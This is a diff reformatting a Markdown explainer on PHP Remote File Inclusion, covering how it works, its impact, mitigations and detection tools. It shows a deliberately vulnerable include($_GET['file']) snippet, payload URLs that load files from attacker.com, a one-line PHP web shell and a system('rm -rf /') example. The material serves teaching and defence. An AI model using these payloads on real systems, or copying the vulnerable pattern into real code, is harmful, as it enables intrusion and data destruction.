@@ -1,17 +1,22 @@
-## Remote File Inclusion (RFI)
+<br>
+
+# Remote File Inclusion (RFI)
 Remote File Inclusion (RFI) is **a web security vulnerability that allows an attacker to include and execute a remote file on a web server by manipulating user input**. Although RFI was historically a significant threat, it is less common today due to better secure coding practices and restrictions in modern web environments.
 
 ## 1. How Remote File Inclusion Works
 RFI occurs when a web application **dynamically includes files based on user input without proper validation or sanitization**. This vulnerability allows attackers to include malicious files hosted on remote servers.
 
-### Vulnerable Code Example
+### Vulnerable Code Example  
+
 ```
 <?php
     $file = $_GET['file'];
     include($file);
 ?>
 ```
-### Input URL
+
+### Input URL  
+
 ```
 http://example.com/index.php?file=http://attacker.com/malicious.php
 ```
@@ -25,7 +30,8 @@ http://example.com/index.php?file=http://attacker.com/malicious.php
 ### 1. Modern PHP Settings
 - By default, modern versions of PHP **disable the allow_url_include directive**.
 - This prevents inclusion of remote files via functions like include() or require().
-- Example (disabled in php.ini)
+- Example (disabled in php.ini)  
+
 ```
 allow_url_include = Off
 ```
@@ -43,20 +49,23 @@ allow_url_include = Off
 
 ### a. File Inclusion
 - Inject a remote file containing malicious code (e.g., a **web shell**).
-- Example Payload
+- Example Payload  
+
 ```
 http://example.com/index.php?file=http://attacker.com/shell.php
 ```
 
 ### b. Code Execution
 - Execute PHP code directly through a remotely included file.
-- Example
-  - http://attacker.com/shell.php contains:
+- Example  
+  - http://attacker.com/shell.php contains:  
+
 ```
 <?php system($_GET['cmd']); ?>
 ```
 
-  - Access via
+  - Access via  
+
 ```
 http://example.com/index.php?file=http://attacker.com/shell.php&cmd=id
 ```
@@ -68,7 +77,8 @@ http://example.com/index.php?file=http://attacker.com/shell.php&cmd=id
 ## 4. Potential Impact of RFI
 ### 1. Code Execution
   - Remote files containing PHP or server-side code can execute arbitrary commands.
-  - Example
+  - Example  
+
 ```
 <?php
 system('rm -rf /');
@@ -87,14 +97,16 @@ system('rm -rf /');
 
 ## 5. Mitigation Techniques
 ### 1. Disable Remote File Inclusion
-  - **Set allow_url_include to Off in php.ini**
+  - **Set allow_url_include to Off in php.ini**  
+
 ```
 allow_url_include = Off
 ```
 
 ### 2. Sanitize and Validate Input
   - Restrict user input to a predefined whitelist of acceptable files.
-  - Example (PHP)
+  - Example (PHP)  
+
 ```
 $allowed_files = ['home.php', 'about.php', 'contact.php'];
 if (in_array($_GET['file'], $allowed_files)) {
@@ -106,7 +118,8 @@ if (in_array($_GET['file'], $allowed_files)) {
 
 ### 3. Use Secure File Inclusion
   - Always **use static paths** or resolve files locally.
-  - Example
+  - Example  
+
 ```
 include('pages/' . basename($_GET['file']));
 ```
@@ -115,7 +128,8 @@ include('pages/' . basename($_GET['file']));
   - Limit access to sensitive files and directories on the server.
 
 ### 5. Content Security Policy (CSP)
-  - **Enforce CSP headers** to restrict external script and resource inclusion:
+  - **Enforce CSP headers** to restrict external script and resource inclusion:  
+
 ```
 Content-Security-Policy: script-src 'self';
 ```
@@ -135,7 +149,8 @@ Content-Security-Policy: script-src 'self';
   - A web server scanner that detects RFI vulnerabilities.
 
 ### 4. Manual Testing
-  - Use payloads like:
+  - Use payloads like:  
+
 ```
 http://example.com/index.php?file=http://attacker.com/malicious.php
 ```
@@ -145,7 +160,8 @@ http://example.com/index.php?file=http://attacker.com/malicious.php
 
 ### Case Study: RFI in PHP Applications
   - An old PHP application dynamically included files based on user input.
-  - An attacker injected
+  - An attacker injected  
+
 ```
 http://example.com/index.php?file=http://attacker.com/malicious.php
 ```
@@ -163,5 +179,5 @@ http://example.com/index.php?file=http://attacker.com/malicious.php
 | Prevention Techniques | Disable allow_url_include, validate input, enforce CSP, use WAF. |
 | Tools for Detection | Burp Suite, OWASP ZAP, manual payload testing. |
 
-
-**While Remote File Inclusion (RFI) is less common today due to improved server and application configurations, it remains a critical vulnerability for legacy systems and poorly configured applications**. By adopting **secure coding practices**, **validating user input**, and leveraging **server-side restrictions**, organizations can effectively mitigate the risks associated with RFI.
+**While Remote File Inclusion (RFI) is less common today due to improved server and application configurations, it remains a critical vulnerability for legacy systems and poorly configured applications**. By adopting **secure coding practices**, **validating user input**, and leveraging **server-side restrictions**, organizations can effectively mitigate the risks associated with RFI.  
+<br>
